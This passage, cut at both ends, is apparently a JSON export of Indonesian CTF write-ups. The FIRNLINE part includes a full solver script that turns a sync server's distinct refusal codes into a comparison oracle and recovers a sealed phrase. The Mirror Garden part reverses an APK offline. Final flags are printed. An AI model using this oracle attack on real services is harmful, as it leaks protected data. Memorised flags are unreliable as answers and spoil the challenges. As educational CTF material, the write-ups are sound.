len(cloud)\n                for i in range(dimension)\n            )\n            observations.append((plane, cloud, center))\n            pair.append(plane)\n\n        delta = tuple(a - b for a, b in zip(pair[0], pair[1]))\n        if delta not in deltas and tuple(-v for v in delta) not in deltas:\n            deltas.append(delta)\n\n    if not planes or len(deltas) != 9:\n        raise ValueError(f\"Unexpected model structure: {len(planes)} patches, {len(deltas)} deltas\")\n\n    # Each patch is a base affine form plus a binary combination of the paired\n    # deltas. The sign of each delta's affine form identifies its activation.\n    for base in sorted(planes):\n        for signs in itertools.product((1, -1), repeat=len(deltas)):\n            oriented = [\n                tuple(sign * value for value in delta)\n                for sign, delta in zip(signs, deltas)\n            ]\n            patch_masks = {}\n            for mask in range(1 << len(oriented)):\n                patch = tuple(\n                    base[k] + sum(((mask >> j) & 1) * oriented[j][k] for j in range(len(oriented)))\n                    for k in range(dimension + 1)\n                )\n                patch_masks[patch] = mask\n\n            if not planes.issubset(patch_masks):\n                continue\n\n            activation_signs = []\n            for j, delta in enumerate(oriented):\n                valid = []\n                for orientation in (1, -1):\n                    if all(\n                        bool((patch_masks[plane] >> j) & 1)\n                        == (orientation * (dot(delta, list(center)) + delta[-1]) > 0)\n                        for plane, _cloud, center in observations\n                    ):\n                        valid.append(orientation)\n                if len(valid) != 1:\n                    break\n                activation_signs.append(valid[0])\n            if len(activation_signs) == len(oriented):\n                model = (base, oriented, activation_signs, patch_masks)\n                break\n        else:\n            continue\n        break\n    else:\n        raise ValueError(\"Could not recover binary affine activations from captures\")\n\n    base, oriented, activation_signs, patch_masks = model\n\n    # Validate that every observed point has the activation pattern belonging\n    # to its recovered affine patch.\n    for plane, cloud, _center in observations:\n        expected_mask = patch_masks[plane]\n        for point in cloud:\n            x = point[\"x\"]\n            for j, delta in enumerate(oriented):\n                score = dot(delta, x) + delta[-1]\n                active = activation_signs[j] * score > 0\n                if active != bool((expected_mask >> j) & 1):\n                    raise ValueError(\"A cloud point disagrees with its recovered activation region\")\n\n    return base, oriented, activation_signs\n\n\ndef evaluate(x, model) -> Fraction:\n    base, deltas, activation_signs = model\n    mask = 0\n    for j, (delta, orientation) in enumerate(zip(deltas, activation_signs)):\n        if orientation * (dot(delta, x) + delta[-1]) > 0:\n            mask |= 1 << j\n    patch = tuple(\n        base[k] + sum(((mask >> j) & 1) * deltas[j][k] for j in range(len(deltas)))\n        for k in range(len(base))\n    )\n    return dot(patch, x) + patch[-1]\n\n\ndef main() -> None:\n    data = json.loads((BASE_DIR / \"data.json\").read_text())\n    model = extract_model(data)\n\n    for index, anchor in enumerate(data[\"anchors\"]):\n        recovered = evaluate(anchor[\"x\"], model)\n        if recovered != q(anchor[\"y\"]):\n            raise ValueError(f\"Anchor {index} mismatch: recovered {recovered}, expected {anchor['y']}\")\n\n    answer = [str(evaluate(target, model)) for target in data[\"targets\"]]\n    if len(answer) != 24:\n        raise ValueError(f\"Expected 24 target outputs, produced {len(answer)}\")\n\n    print(\"Recovered outputs:\")\n    print(json.dumps(answer, separators=(\",\", \":\")))\n    print(\"Flag:\")\n    print(unlock(answer))\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{577027585a0778773aa949d9}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-mobile-fimline",
    "title": "FIRNLINE — Thawing the Sealed Vault",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "> **Kategori:** Mobile / Android + API / CRDT side channel  \n> **Aplikasi:** `org.isfcr.firnline`, versi 3.2.0  \n> **Kesulitan utama:** membocorkan register tersembunyi melalui *comparison oracle*  \n> **Status:** **SOLVED**, dikonfirmasi oleh respons `ok: true` dari `/v1/thaw`",
    "problemDescription": "FIRNLINE adalah aplikasi Android untuk mencatat perpindahan dan kepemilikan sampel ice-core di ekspedisi SHARD-24. Aplikasi bisa offline dan menyinkronkan record ke station. Record `vault/release` milik custodian sengaja disegel: saat di-*pull*, isinya tidak ditampilkan.\n\nBug-nya bukan di algoritma kriptografi native. Server memproses operasi CRDT dengan urutan yang bisa diamati: **membandingkan register lama dan baru sebelum menolak penulis yang bukan owner**. Akibatnya, operasi ke vault milik orang lain menghasilkan dua respons yang berbeda:\n\n- `res=1` jika nilai kandidat tidak mengalahkan register rahasia;\n- `res=2` jika kandidat lebih unggul, tetapi perangkat kita tidak punya izin menulis.\n\nDua status ini menjadi **oracle pembanding**. Dengan binary search bertahap, kita memperoleh HLC, replica ID, dan string phrase tersembunyi. Satu jebakan tambahan adalah urutan kapitalisasi: alfabet ASCII mentah tidak monoton menurut perilaku server, sehingga 22 bit *case mask* harus dipulihkan terpisah.\n\n**Hasil akhir:**\n\n```text\nAccepted phrase: n4mYuSCyQpkqDSZjUZH7vwpt\n<FLAG>isfcr{firn_8ab9_drifts_9fe72fa1_under_ice}</FLAG>\n```",
    "tools": [],
    "analysis": "APK memiliki satu `classes.dex` dan dua versi library `libfirn.so` (`arm64-v8a` dan `x86_64`). Static analysis menunjukkan beberapa metode penting:\n\n| Metode | Fungsi |\n|---|---|\n| `Station.enroll()` | Mengirim install ID ke `/v1/enroll`, menerima device ID serta secret terbungkus. |\n| `Native.unwrap()` | Membuka secret yang diterima ketika enrollment. |\n| `Native.seal()` / `Native.open()` | Membentuk dan membuka frame komunikasi terenkripsi. |\n| `Station.pull()` | Mengambil record memakai `/v1/pull`. |\n| `Station.sync()` | Mengirim operasi CRDT memakai `/v1/sync`. |\n| `Station.thaw()` | Memeriksa phrase dengan `POST /v1/thaw`. |\n| `Field.holdsRelease()` | Mengecek apakah owner `vault/release` sama dengan device kita. |\n| `Register.order()` | Membandingkan register berdasarkan HLC, replica, lalu string value. |\n\n`ReleaseActivity` memakai pola validasi:\n\n```regex\n[A-HJKMNP-Za-hjkmnp-z2-9]{24}\n```\n\nTombol **Seal with this phrase** dibatasi ownership melalui `Field.holdsRelease()`. Sebaliknya, **Thaw** mengirim phrase ke endpoint server, dan server hanya mengembalikan release setelah pemeriksaan berhasil. Mengubah UI saja tidak akan memberi flag.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `firnline.apk` — aplikasi Android yang dibedah.\n- `Original_Readme.md` — petunjuk dari penyelenggara, termasuk mekanisme station dan enrollment.\n- `classes.dex` — implementasi UI, local ledger, clock, dan protokol aplikasi.\n- `libfirn.so` — library JNI untuk membungkus komunikasi terenkripsi dengan station.\n- `firn_client.py`, `native_bridge.py`, `firn_cbor.py` — client Python yang dibuat dari analisis APK.\n- `solve.py` — solver terpadu untuk merekonstruksi register rahasia melalui station CTF sendiri.\n\nSHA-256 APK:",
        "code": "624fc914497079003f8599a50191a40b89dd17b74c914e84b96f2d0d9f1cdd86"
      },
      {
        "title": "Bentuk komunikasi",
        "content": "Setelah enrollment, `pull` dan `sync` memakai data CBOR di dalam frame dari `libfirn.so`; `thaw` memakai JSON. Satu operasi sinkronisasi disusun seperti ini:\n\n\n\nContoh record vault yang terlihat dari hasil `pull`:\n\n\n\nOwner tersebut **bukan** device yang baru kita daftarkan. Field `phrase` sengaja tidak dikembalikan oleh `pull`.",
        "code": "[record_id, field_name, value, hlc, replica_bytes]"
      },
      {
        "title": "Memahami Status Sync",
        "content": "Kita membangun `firn_client.py` memakai library native asli agar dapat berkomunikasi tanpa emulator. Pengujian pada station CTF milik sendiri memberikan:\n\n| Pengujian | Respons | Implikasi |\n|---|---|---|\n| Menulis `core/test.note` yang kita miliki | `[0]` | Update diterima. |\n| Menulis `site/FC3.grid` milik custodian | `[2]` | Ditolak karena ownership. |\n| Memalsukan `replica` sebagai owner custodian | `[2]` | Replica bukan identitas pemilik. |\n| Mendaftarkan 12 perangkat lain lalu mencoba lagi | `[2]` | Eviction tidak membuka ownership. |\n| Satu batch: `core/test` + `site/FC3` | `[0,2]` | Validasi dilakukan per operasi. |\n| Field tak dikenal `_probe` pada record sendiri | `[3]` | Field ditolak. |\n| Update lama `core/test.note` dengan HLC `0` | `[1]` | Operasi kalah dalam arbitrase register. |\n\nMakna kode yang **diamati** selama eksperimen:\n\n\n\nIni adalah klasifikasi dari perilaku yang teramati, bukan hasil membaca source server.",
        "code": "0 = applied\n1 = superseded / kalah urutan\n2 = refused / tidak berwenang\n3 = rejected / input tidak valid"
      },
      {
        "title": "Titik kebocoran",
        "content": "Operasi ke `vault/release.phrase` menghasilkan:\n\n\n\nKedua operasi memakai device yang sama dan sama-sama tidak punya hak tulis. Satu-satunya beda yang sengaja kita uji adalah urutan HLC. Dengan kata lain, respons *tidak* hanya memberitahu \"authorized atau tidak\"; respons turut mengungkap apakah register yang kita tawarkan menang atau kalah.\n\nAlur server yang **konsisten dengan pengamatan** dapat ditulis sebagai pseudocode berikut (bukan source server asli):\n\n\n\nDengan status tersebut, sebuah field yang disegel berubah menjadi *comparison oracle* tanpa pernah muncul di respons `pull`.",
        "code": "HLC = 0                 -> res: [1]\nHLC = waktu saat ini   -> res: [2]"
      },
      {
        "title": "Memulihkan HLC Rahasia",
        "content": "Urutan CRDT dari `Register.order()` di DEX adalah:\n\n1. HLC (unsigned 64-bit);\n2. replica ID (perbandingan 16 byte);\n3. string value jika dua kunci sebelumnya sama.\n\nClock Android menghasilkan HLC awal dari `currentTimeMillis() << 16`, sementara respons `/v1/pull` mempunyai field waktu server `t`. HLC `0` memberi status `1`, sedangkan `t` memberi status `2` — dua batas untuk pencarian.\n\nKita mengirim beberapa kandidat HLC dalam satu batch, mengamati transisi dari `1` ke `2`, lalu mempersempit interval secara iteratif. Hasil station ini:\n\n\n\n**Catatan:** angka tersebut spesifik pada station/record yang diuji, bukan nilai universal seluruh instance challenge.",
        "code": "Hidden HLC: 117256638153752578"
      },
      {
        "title": "Memulihkan Replica ID",
        "content": "Setelah HLC diketahui, kedua kandidat memakai HLC sama dan phrase minimal. Kita menyapu nilai replica dari 16 byte `00...00` sampai `ff...ff`, lalu kembali melakukan pencarian transisi `1 → 2`.\n\n\n\nIni adalah **replica penulis register phrase**, bukan owner device `cfcf...` dan bukan replica milik client kita. Mengetahui replica tidak memberi hak tulis; nilainya hanya membuat pembandingan mencapai tingkat berikutnya, yaitu `value`.",
        "code": "Calibration: [00..00, ff..ff] -> [1, 2]\nHidden replica: d16afa6a31fb5cadf1abdb598b9520bd"
      },
      {
        "title": "Jebakan: Urutan Huruf Bukan ASCII Biasa",
        "content": "Dengan HLC dan replica yang sama, kita mulai menguji string `phrase` berpanjang 24 dari alfabet yang diketahui. Solver pertama mengira hasil perbandingan akan monoton mengikuti ASCII, tetapi gagal dengan:\n\n\n\nContoh pengujian karakter pertama:\n\n\n\nPerhatikan bahwa `e` kembali menghasilkan `1` setelah `P` menghasilkan `2`. Maka string yang diuji **tidak** dapat diurutkan hanya berdasarkan kode ASCII asli.\n\nDari data itu kita membuat hipotesis bahwa server memakai pembandingan **karakter dasar/case-folded sebagai urutan utama, lalu kapitalisasi sebagai pembeda tambahan**. Ini inferensi dari oracle server; kode client Android sendiri hanya memperlihatkan `String.compareTo()` dan tidak membuktikan comparator di backend identik.\n\nDengan mengelompokkan varian uppercase/lowercase per karakter dasar, didapatkan 24 karakter berikut:\n\n\n\nSebanyak 22 posisi berupa huruf. Pembacaan ini belum memulihkan kapitalisasi yang tepat. Percobaan `thaw` menggunakan versi seluruh lowercase maupun uppercase sama-sama mendapat `403`.",
        "code": "RuntimeError: char 0: non-monotone results"
      },
      {
        "title": "Memulihkan 22 Bit Kapitalisasi",
        "content": "Diagnostik selanjutnya menunjukkan server bisa membedakan representasi case ketika seluruh karakter dasar sama:\n\n\n\nKita ubah setiap huruf menjadi satu bit:\n\n- `0` = lowercase;\n- `1` = uppercase;\n- digit `4` dan `7` tidak memakai bit.\n\nAda **22 huruf**, jadi total ruang case mask adalah `2^22 = 4,194,304` kemungkinan. Namun kita tidak perlu mencoba semuanya. Setelah monotonisitas diperiksa dengan sembilan sampel, binary search bertahap cukup mencari batas transisi `1 → 2`.\n\n\n\nDua kandidat di sekitar titik batas:\n\n\n\nAmbiguitas di titik persis batas memungkinkan dua kandidat, sehingga hasil *comparison oracle* tetap harus diperiksa lewat `thaw`.",
        "code": "lowercase  -> 1\nUPPERCASE  -> 2\nmixed_case -> 1"
      },
      {
        "title": "Validasi dan Flag",
        "content": "Kandidat pertama dikirim ke `/v1/thaw`, dan station merespons:\n\n\n\nInilah bukti penentu: **flag datang langsung dari server**, bukan dari flag buatan di solver atau perubahan lokal pada APK. Respons `ok: true` juga memverifikasi kapitalisasi phrase hasil recovery.",
        "code": "[+] Response: {'ok': True, 'release': 'isfcr{firn_8ab9_drifts_9fe72fa1_under_ice}'}\n\n<FLAG>isfcr{firn_8ab9_drifts_9fe72fa1_under_ice}</FLAG>"
      },
      {
        "title": "Cara Menjalankan Solver",
        "content": "File `solve.py` menyatukan empat tahap: recover HLC, recover replica, recover 24 karakter dasar, dan recover 22 bit case mask. Solver memakai `firn_client.py`, `native_bridge.py`, `firn_cbor.py`, dan `recover_phrase_oracle.py` yang sudah tersedia dalam paket.\n\nUntuk instance baru, buka station link milik tim sendiri, lalu:\n\n\n\n`solve.py` **tidak** menyimpan URL station ataupun device secret dalam source. Secret enrollment disimpan secara lokal oleh client dan tidak perlu diserahkan ke orang lain.\n\n**Batas verifikasi:** rangkaian V1/V2/V3 yang dijalankan pada station asli terbukti menghasilkan flag. `solve.py` terpadu kemudian diuji memakai simulator comparator yang mereproduksi nilai HLC, replica, mask, dan flag dari sesi tersebut; belum ada eksekusi ulang solver terpadu terhadap server asli.",
        "code": "export STATION='https://HOST/s/LINK/'\npython3 firn_client.py --url \"$STATION\" enroll\npython3 solve.py --url \"$STATION\""
      },
      {
        "title": "Catatan",
        "content": "- Semua percobaan dilakukan hanya terhadap station CTF yang diberikan penyelenggara, melalui terminal milik peserta; tidak ada pemindaian atau target eksternal.\n- Metode eviction, replica spoofing, dan penulisan langsung pada vault **tidak** menjadi jalur solve.\n- HLC dan replica hasil recovery adalah data instance yang dianalisis; jika station baru dibuat, jalankan pencarian dari awal.\n- Solver menghentikan percobaan apabila menemukan kode status selain `1`/`2`. Ini mengurangi risiko, tetapi tidak bisa membatalkan operasi yang sudah diproses server.\n- Tidak perlu memodifikasi APK, mengubah owner vault, atau melakukan brute force jutaan kandidat phrase.\n\n---\n\n**Final flag:** `isfcr{firn_8ab9_drifts_9fe72fa1_under_ice}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"FIRNLINE CTF — reproduce the CRDT comparison-oracle recovery.\n\nRuns ONLY with an explicitly supplied station link and previously enrolled state.\nUses /v1/pull and /v1/sync, checks every returned status is 1 or 2,\nand verifies the final phrase using /v1/thaw. Does not need an emulator.\n\"\"\"\nimport argparse\nfrom pathlib import Path\nfrom firn_client import StationClient, STATE, stringify\nfrom recover_phrase_oracle import Oracle\n\nTARGET = 'vault/release'\nALPHABET = '23456789abcdefghjkmnpqrstuvwxyz'\nPHRASE_LEN = 24\n\n\ndef recover_base(oracle, hlc, replica):\n    \"\"\"Find the case-folded 24-symbol text; preserve only lower-case letters.\"\"\"\n    prefix = ''\n    for pos in range(PHRASE_LEN):\n        suffix = '2' * (PHRASE_LEN - pos - 1)\n        variants = [(char,) if char.isdigit() else (char.upper(), char)\n                    for char in ALPHABET]\n        probes = [(hlc, replica, prefix + char + suffix)\n                  for variant in variants for char in variant]\n        answers = oracle.ask(probes)\n        groups = []\n        off = 0\n        for variant in variants:\n            groups.append(answers[off:off+len(variant)])\n            off += len(variant)\n        has_one = [1 in group for group in groups]\n        if not has_one[0] or any((not left and right) for left, right\n                                 in zip(has_one, has_one[1:])):\n            raise RuntimeError(f'Non-monotone base alphabet at position {pos+1}')\n        idx = max(i for i, yes in enumerate(has_one) if yes)\n        prefix += ALPHABET[idx]\n        print(f'  base {pos+1:02d}/{PHRASE_LEN}: {prefix}', flush=True)\n    return prefix\n\n\ndef recover_case(oracle, hlc, replica, base):\n    positions = [pos for pos, ch in enumerate(base) if ch.isalpha()]\n    count = len(positions)\n    max_mask = (1 << count) - 1\n\n    def candidate(mask):\n        chars = list(base)\n        for j, pos in enumerate(positions):\n            if mask & (1 << (count-1-j)):\n                chars[pos] = chars[pos].upper()\n        return ''.join(chars)\n\n    def probe(masks):\n        return oracle.ask([(hlc, replica, candidate(m)) for m in masks])\n\n    # Confirm the service implements an ordered transition for this station.\n    samples = [max_mask * i // 8 for i in range(9)]\n    status = probe(samples)\n    print('[*] Case-mask calibration:', list(zip([hex(i) for i in samples], status)))\n    if status[0] != 1 or status[-1] != 2 or any(a > b for a, b in zip(status, status[1:])):\n        raise RuntimeError('Case masks are not monotone or do not bracket the secret')\n\n    lo, hi = 0, max_mask\n    while hi-lo > 1:\n        samples = sorted({lo + (hi-lo)*i//9 for i in range(1,9)})\n        samples = [v for v in samples if lo < v < hi]\n        status = probe(samples)\n        if any(a > b for a,b in zip(status,status[1:])):\n            raise RuntimeError('Case-mask comparator ceased to be monotone')\n        for mask, code in zip(samples, status):\n            if code == 1:\n                lo = mask\n            else:\n                hi = mask\n                break\n        print('  remaining case masks:', hi-lo, flush=True)\n    return candidate(lo), candidate(hi), lo, hi\n\n\ndef recover_all(client, pause=0.05, batch_size=15):\n    oracle = Oracle(client, batch_size=batch_size, pause=pause)\n    t = client.pull().get('t')\n    if not isinstance(t, int) or t <= 0:\n        raise RuntimeError('Missing server clock in /v1/pull reply')\n\n    print('[1/4] HLC oracle')\n    hlc = oracle.get_hlc(t)\n    print('[+] HLC:', hlc)\n\n    print('[2/4] Replica oracle')\n    replica = oracle.get_replica(hlc)\n    print('[+] Replica:', replica.hex())\n\n    print('[3/4] Base alphabet oracle')\n    base = recover_base(oracle, hlc, replica)\n    print('[+] Case-folded phrase:', base)\n\n    print('[4/4] Case-mask oracle')\n    cand_lo, cand_hi, mask_lo, mask_hi = recover_case(oracle, hlc, replica, base)\n    print('[+] Adjacent case masks:', hex(mask_lo), hex(mask_hi))\n    print('[+] Adjacent candidates:', repr(cand_lo), repr(cand_hi))\n    print('[+] Oracle usage:', oracle.calls, 'requests;', oracle.ops, 'operations')\n\n    for phrase in dict.fromkeys((cand_lo, cand_hi)):\n        try:\n            out = client.thaw(phrase)\n        except RuntimeError as exc:\n            print('[-] Thaw rejected', phrase, ':', exc)\n            continue\n        print('[+] /v1/thaw:', stringify(out))\n        if out.get('ok') is True and str(out.get('release', '')).startswith('isfcr{'):\n            print('[+] Accepted phrase:', phrase)\n            print('<FLAG>' + str(out['release']) + '</FLAG>')\n            return out['release']\n    raise RuntimeError('Both boundary phrases rejected; no verified flag')\n\n\ndef main():\n    p = argparse.ArgumentParser(description='FIRNLINE CTF end-to-end comparison-oracle solver')\n    p.add_argument('--url', required=True, help='your own /s/<link>/ URL')\n    p.add_argument('--state', default=str(STATE))\n    p.add_argument('--pause', type=float, default=0.05)\n    p.add_argument('--batch-size', type=int, default=15)\n    args = p.parse_args()\n    if not 1 <= args.batch_size <= 32:\n        p.error('--batch-size must be 1..32')\n    client = StationClient(args.url, Path(args.state))\n    if not client.state.get('secret'):\n        p.error('Enroll first: python3 firn_client.py --url \"$STATION\" enroll')\n    recover_all(client, args.pause, args.batch_size)\n\n\nif __name__ == '__main__':\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{firn_8ab9_drifts_9fe72fa1_under_ice}",
    "lessonsLearned": "Masalahnya adalah kebocoran informasi akibat **urutan validasi dan granularitas kode error**:\n\n```mermaid\nflowchart TD\n    A[Non-owner mengirim kandidat register] --> B{Kandidat mengalahkan register tersimpan?}\n    B -- Tidak --> C[res = 1]\n    B -- Ya --> D{Device adalah owner?}\n    D -- Tidak --> E[res = 2]\n    D -- Ya --> F[res = 0]\n    C --> G[Observer memperoleh hasil perbandingan]\n    E --> G\n    G --> H[Binary search HLC, replica, phrase, case mask]\n    H --> I[POST /v1/thaw]\n    I --> J[Release flag]\n```\n\nDua respons yang semula tampak seperti status sinkronisasi biasa sudah cukup menjadi kanal untuk membaca nilai yang seharusnya tersegel. Sebuah pemeriksaan ownership yang selalu dilakukan **sebelum perbandingan dengan data rahasia**, disertai respons publik yang tidak membocorkan hasil perbandingan, akan menghilangkan oracle yang kita manfaatkan."
  },
  {
    "id": "cryovault-mobile-mirrorgarden",
    "title": "Mirror Garden",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Mirror Garden",
    "problemDescription": "APK menyembunyikan flag dengan gabungan pemilihan class Java secara dinamis, pemeriksaan aritmetika bytecode Dalvik, XOR, SHA-256, dan HMAC-SHA256 di native library ARM64. Ada 1.024 class `leaf`, tetapi **hanya satu class yang dipakai**. Flag tidak tersimpan sebagai teks utuh; native code membentuk string final setelah pemeriksaan HMAC berhasil.\n\n**Flag terverifikasi:** `isfcr{m1rr0r_g4rden_bl00ms_@t_m1dn1ght_7f3a}`",
    "tools": [],
    "analysis": "Enumerasi ZIP APK memperlihatkan satu DEX yang cukup besar dan satu native library ARM64 kecil. `strings` di DEX menampilkan ribuan nama class `leaf`; string flag lengkap tidak muncul. Dari Java, tombol UI membaca teks, mengubahnya menjadi byte array, lalu memanggil method JNI `bloom(byte[])`.\n\nDi JNI, nama class dan nama method dibangun dari string yang di-XOR dengan `0x5a`:\n\n- Format class: `one/sr/garden/leaf/L%04d`.\n- Method: `verify`.\n- Signature: `([B)[B` (menerima `byte[]`, mengembalikan `byte[]`).\n\nTidak efektif menebak satu per satu 1.024 class. Fungsi native menentukan class dari hasil mixer state secara deterministik.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `mirror-garden.apk`: APK Android berisi `classes.dex`, `lib/arm64-v8a/libgarden.so`, manifest, dan resource.\n- `classes.dex`: 1.030 class, termasuk `MainActivity` dan 1.024 class `one.sr.garden.leaf.L0000` sampai `L1023`.\n- `libgarden.so`: ELF 64-bit AArch64 stripped; mengekspor `Java_one_sr_garden_MainActivity_bloom` di virtual address `0x1b28`.\n- `solve.py`: solver **offline** yang membaca langsung isi APK, melakukan ekstraksi DEX secara minimal, memecahkan kendala dengan `libz3`, dan menghitung flag final."
      },
      {
        "title": "Pemilihan leaf lewat native mixer",
        "content": "Helper native di `libgarden.so:0x2374` memuat 16 word 32-bit dari `.rodata` offset `0x600`, konstanta word dari `0x72c`, dan tabel shift dari `0x5a0`. Mixer menjalankan **24 ronde × 16 word**. Satu langkah ekuivalen dengan:\n\n\n\nPenting: AArch64 menggunakan `ror` dengan shift negatif pada operand tersebut, sehingga ekuivalennya **rotate-left**, bukan rotate-right. Salah arah rotasi menghasilkan leaf palsu dan HMAC tidak cocok.\n\nHasil state awal setelah mixer: `0x1ab67d65`, sehingga `state[0] & 0x3ff = 357`. Class yang benar adalah **`one.sr.garden.leaf.L0357`**. Dua belas word pertama dipakai sebagai masker XOR sepanjang 48 byte:",
        "code": "v = (state[i] + constant[i] +\n     (state[(i+5) & 15] ^ state[(i+1) & 15])) & 0xffffffff\nv ^= rol32(state[(i+11) & 15], i+1)\nstate[i] = rol32(v, shift[i])"
      },
      {
        "title": "Validasi di `L0357.verify([B)[B`",
        "content": "Fungsi Java pada class terpilih menolak array null atau panjang selain **16 byte**. Selanjutnya byte input diubah menjadi nilai unsigned, diolah dalam ekspresi aritmetika 32-bit menggunakan perkalian, rotate, XOR, OR, AND, dan penjumlahan. Ada **delapan instruksi `cmp-long`** yang membandingkan hasil dengan konstanta tersembunyi.\n\nSetiap persamaan bergantung pada empat byte input. Indeks byte per persamaan yang diekstrak dari DEX:\n\n| Persamaan | Indeks byte | Nilai pembanding (uint32) |\n|---|---|---:|\n| 1 | 3, 9, 10, 13 | 2513440520 |\n| 2 | 6, 7, 8, 15 | 2721913321 |\n| 3 | 4, 5, 7, 11 | 1006370560 |\n| 4 | 1, 5, 12, 13 | 595205217 |\n| 5 | 0, 8, 11, 15 | 934859890 |\n| 6 | 2, 6, 10, 14 | 3540975616 |\n| 7 | 1, 9, 12, 14 | 13982574 |\n| 8 | 0, 2, 3, 4 | 4091291860 |\n\n`solve.py` menginterpretasikan opcode aritmetika yang dipakai method ini ke ekspresi SMT 32-bit dan menyelesaikannya dengan Z3. Input 16 byte yang lolos pemeriksaan Java:\n\n\n\nKode `verify` mengambil payload 48 byte lewat instruksi Dalvik `fill-array-data`, kemudian menghasilkan:\n\n\n\nHasilnya belum berupa flag; method JNI menambahkan masker native:",
        "code": "ASCII: L.]^ooq(LlU^(a]#\nHEX:   4c2e5d5e6f6f71284c6c555e28615d23"
      },
      {
        "title": "Derivasi SHA-256 dan autentikasi HMAC",
        "content": "Alur native yang diidentifikasi dari fungsi SHA-256 internal pada `0x2810` dan `0x2b0c`:\n\n\n\nNative menghitung HMAC dengan `m_key` dan pesan tetap 60 byte dari `.rodata`: 16 byte dari offset `0x5b0`, dilanjutkan 44 byte dari offset `0x700`. Enam belas byte pertama dibandingkan dengan konstanta di offset `0x5d0`.\n\n**Bukti verifikasi:**",
        "code": "digest = SHA256(shared)\nm_key = SHA256(digest + b'garden/m/v1')\ne_key = SHA256(digest + b'garden/e/v1')"
      },
      {
        "title": "Konstruksi flag pada jalur sukses",
        "content": "Cabang sukses di native (`0x228c`–`0x2370`) meng-hash `e_key` yang diikuti angka 32-bit little-endian 0 dan 1:\n\n\n\nSemua konstanta XOR tersebut dibaca oleh solver dari `.rodata` native library (offset `0x5c0`, `0x570`, `0x550`, dan `0x728`). Hasilnya 44 byte ASCII valid, lalu dikembalikan oleh JNI lewat `NewStringUTF`.",
        "code": "block0 = SHA256(e_key + LE32(0))\nblock1 = SHA256(e_key + LE32(1))\n\nflag_bytes = (\n    (block0 ^ constant32) +\n    (block1[:8] ^ constant8) +\n    (block1[8:12] ^ constant4)\n)"
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Ringkasnya:",
        "code": "APK -> classes.dex + libgarden.so\n  -> native mixer (24 ronde)\n  -> pilih L0357\n  -> delapan kendala aritmetika Dalvik (Z3)\n  -> kunci input 16 byte\n  -> XOR payload leaf 48 byte dengan kunci berulang\n  -> XOR hasilnya dengan masker native 48 byte\n  -> SHA256 -> kunci e dan m\n  -> HMAC menggunakan kunci m (harus cocok)\n  -> SHA256(e || LE32(0/1)) + XOR konstanta\n  -> flag final (44 byte)"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "Persyaratan: Python 3, library Z3 yang tersedia di sistem (`libz3.so.4`), dan `mirror-garden.apk` dalam direktori yang sama. Script hanya memakai Python standard library dan memanggil `libz3` lewat `ctypes`; tidak perlu `jadx`, emulator Android, koneksi remote, ataupun paket Python tambahan.\n\n\n\nAtau berikan path APK secara eksplisit:\n\n\n\nOutput yang sudah diuji:",
        "code": "cd /mnt/data/mirror-garden\npython3 solve.py"
      },
      {
        "title": "Catatan",
        "content": "- Solving murni offline berdasarkan APK, tidak ada scanning atau interaksi dengan sistem lain.\n- Pemilihan leaf adalah deterministik; jangan mencoba mencari flag dengan `strings` di seluruh leaf tanpa mengikuti native selector.\n- String mirip flag dari leaf yang salah tidak cukup menjadi bukti. Validitas harus dilihat dari **kecocokan HMAC native** dan jalur output sukses.\n- Tidak perlu menjalankan native ARM64 di emulator; semua operasi yang relevan direproduksi dengan Python."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Mirror Garden CTF local APK solver. Python stdlib + system libz3, no network.\n\nUsage: python3 solve.py [mirror-garden.apk]\n\"\"\"\nimport ctypes\nimport ctypes.util\nimport hashlib\nimport hmac\nimport re\nimport struct\nimport sys\nimport zipfile\nfrom pathlib import Path\n\nMASK32 = 0xFFFFFFFF\n\n\ndef rol32(x, n):\n    n &= 31\n    return ((x << n) | (x >> ((32 - n) & 31))) & MASK32\n\n\ndef native_state_and_leaf(native):\n    \"\"\"Translate the 24-round 16-word mixing loop at libgarden.so:0x2374.\"\"\"\n    state = list(struct.unpack_from('<16I', native, 0x600))\n    constant = struct.unpack_from('<16I', native, 0x72C)\n    shifts = native[0x5A0:0x5B0]\n    for _round in range(24):\n        for i in range(16):\n            v = (state[i] + constant[i] +\n                 (state[(i + 5) & 15] ^ state[(i + 1) & 15])) & MASK32\n            # ARM64 ROR with a negative shift is ROL (easy to miss).\n            v ^= rol32(state[(i + 11) & 15], i + 1)\n            state[i] = rol32(v, shifts[i])\n    return state[0] & 0x3FF, struct.pack('<12I', *state[:12])\n\n\nclass Dex:\n    \"\"\"Read just the class/method/code structures needed by the challenge.\"\"\"\n    def __init__(self, blob):\n        self.b = blob\n        self.strings = [self.read_str(self.u32(self.u32(0x3C) + 4 * i))\n                        for i in range(self.u32(0x38))]\n        self.types = [self.strings[self.u32(self.u32(0x44) + 4 * i)]\n                      for i in range(self.u32(0x40))]\n        self.methods = []\n        for i in range(self.u32(0x58)):\n            c, p, n = struct.unpack_from('<HHI', blob, self.u32(0x5C) + i * 8)\n            self.methods.append((self.types[c], self.strings[n]))\n\n    def u32(self, p):\n        return struct.unpack_from('<I', self.b, p)[0]\n\n    def leb(self, p):\n        result = shift = 0\n        while True:\n            v = self.b[p]\n            p += 1\n            result |= (v & 0x7F) << shift\n            shift += 7\n            if not (v & 0x80):\n                return result, p\n\n    def read_str(self, p):\n        _, p = self.leb(p)\n        return self.b[p:self.b.index(b'\\0', p)].decode('utf-8', 'replace')\n\n    def get_method(self, class_name, method_name):\n        for i in range(self.u32(0x60)):\n            addr = self.u32(0x64) + i * 32\n            c, _, _, _, _, _, data, _ = struct.unpack_from('<8I', self.b, addr)\n            if self.types[c] != 